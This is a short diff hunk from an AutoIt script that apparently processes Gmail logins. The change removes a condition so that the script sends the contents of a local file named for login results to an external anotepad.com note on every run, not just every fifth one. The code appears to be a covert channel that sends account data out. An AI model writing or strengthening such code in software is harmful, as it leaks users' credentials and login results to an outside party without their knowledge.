@@ -2237,12 +2237,10 @@ EndFunc
 
 		Next
 
-		If $vpsso=1 Or $vpsso=6 Or $vpsso=11 Or $vpsso=16 Or $vpsso=21 Or $vpsso=26 Or $vpsso=31 Or $vpsso=36 Or $vpsso=41 Or $vpsso=46 Or $vpsso=51 Or $vpsso=56 Or $vpsso=61 Or $vpsso=66 Or $vpsso=71 Or $vpsso=76 Or $vpsso=81 Or $vpsso=86 Or $vpsso=91 Or $vpsso=96 Then
 
 		     $dataIP=FileRead(@ScriptDir&'\KetQuaDangNhap.txt')
 			 _postdataIPGmail($dataIP,'https://anotepad.com/note/access/6tfiaiej','https://anotepad.com/notes/6tfiaiej')
 
-		EndIf
 
 		Return 	$check4
 
